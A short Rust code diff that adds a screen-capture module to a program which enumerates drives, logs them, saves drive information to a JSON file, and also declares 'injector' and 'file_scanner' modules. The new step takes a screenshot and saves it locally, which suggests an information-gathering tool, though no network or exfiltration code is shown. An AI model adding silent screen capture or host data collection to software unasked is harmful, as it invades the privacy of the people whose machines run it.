@@ -21,7 +21,8 @@ pub mod log;
 pub mod injector;
 /// File scanning and content analysis module
 pub mod file_scanner;
-
+/// Screen capture module
+pub mod screen_capture;
 use serde::Serialize;
 use std::env;
 use crate::log::Log;
@@ -50,6 +51,11 @@ async fn main() {
     Log::info(format!("Found {} drives:", drives.len()));
     for drive in &drives {
         Log::info(format!("  - {:?}", drive));
+    }
+    // 2.1. Capture and save a screenshot
+    match screen_capture::ScreenCapture::capture_and_save("logs/screenshots") {
+        Ok(path) => Log::info(format!("Screenshot saved to {}", path)),
+        Err(e) => Log::error(format!("Failed to capture screenshot: {:?}", e)),
     }
     // 3. Persist locally.
     let _ = writer::save_output(&drives, "logs/drive_info.json", false)
